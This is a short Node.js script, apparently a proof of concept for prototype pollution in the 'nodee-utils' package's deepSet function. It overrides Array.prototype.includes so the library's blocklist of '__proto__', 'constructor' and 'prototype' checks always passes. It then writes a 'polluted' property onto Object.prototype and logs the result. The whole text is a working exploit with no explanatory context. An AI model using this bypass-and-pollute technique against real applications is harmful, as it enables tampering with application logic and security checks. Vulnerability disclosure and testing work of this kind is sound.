Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {object} = require('nodee-utils');
var obj = {};
console.log({}.polluted);
object.deepSet({}, '__proto__.polluted', 'yes');
console.log({}.polluted);